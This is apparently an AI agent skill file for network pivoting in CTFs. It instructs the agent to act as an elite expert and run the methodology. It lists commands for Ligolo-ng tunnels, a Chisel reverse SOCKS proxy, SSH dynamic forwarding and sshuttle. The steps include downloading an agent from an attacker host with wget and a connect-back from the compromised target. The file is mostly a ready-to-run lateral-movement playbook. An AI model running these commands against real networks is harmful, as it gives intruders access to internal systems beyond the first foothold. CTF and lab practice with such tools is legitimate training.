# Pivoting Specialist

Especialista en pivoting-specialist

## Instructions
Eres un experto de élite en pivoting-specialist. Tu objetivo es ejecutar la siguiente metodología con precisión quirúrgica y eficiencia técnica.

---
name: pivoting-specialist
description: |
  Specialized guide and command generator for Network Pivoting and Tunneling.
  Focuses on modern techniques like Ligolo-ng (tun interfaces), Chisel (SOCKS5), 
  and SSH dynamic forwarding. Essential for accessing internal networks in CTFs.
version: 1.0.0
author: Gemini
domain: ctf/network
difficulty: interactions
prerequisites:
  - ligolo-ng (proxy & agent)
  - chisel
  - ssh
---

# Pivoting Specialist: Tunneling & Lateral Movement

## 1. Ligolo-ng (The Modern Standard)

**Trigger:** "Setup ligolo", "Pivot with ligolo", "Tunnel 172.16.x.x"

**Concept:** Uses TUN interfaces for true VPN-like pivoting (ICMP, SYN scan possible).

### Server Setup (Kali)
1.  **Create Interface:**
    `sudo ip tuntap add user kali mode tun ligolo`
    `sudo ip link set ligolo up`
2.  **Start Proxy:**
    `./proxy -selfcert`

### Agent Setup (Target)
1.  **Upload Agent:**
    `wget http://<kali-ip>/agent` (or via SMB/Upload)
2.  **Connect Back:**
    `./agent -connect <kali-ip>:11601 -ignore-cert`

### Routing (On Kali Proxy Console)
1.  **Select Session:** `session` -> Select the agent.
2.  **Add Route:**
    `sudo ip route add <internal-subnet>/24 dev ligolo`
    *Example:* `sudo ip route add 172.16.50.0/24 dev ligolo`
3.  **Start:** `start`

## 2. Chisel (SOCKS5 Reverse Proxy)

**Trigger:** "Setup chisel", "SOCKS5 proxy"

**Concept:** Best for when you just need a SOCKS proxy for Burp/Browser/Nmap(TCP Connect).

### Server (Kali)
`./chisel server -p 8000 --reverse`

### Client (Target)
`./chisel client <kali-ip>:8000 R:socks`

### Usage
- Modify `/etc/proxychains4.conf`: `socks5 127.0.0.1 1080`
- Run tools: `proxychains nmap ...`

## 3. SSH Dynamic Port Forwarding

**Trigger:** "SSH pivoting", "Dynamic forwarding"

**Command:**
`ssh -D 1080 user@<target-ip>`

**Usage:**
- Configure Proxychains to port 1080.
- Good for quick web browsing of internal apps.

## 4. sshuttle (VPN over SSH)

**Trigger:** "sshuttle", "easy vpn"

**Command:**
`sshuttle -r user@<target-ip> <subnet>/24`
*Example:* `sshuttle -r root@10.10.10.10 172.16.50.0/24`

**Note:** Requires Python on both ends. No root needed on target, but root needed on Kali.


## Available Resources
- . (Directorio de la skill)
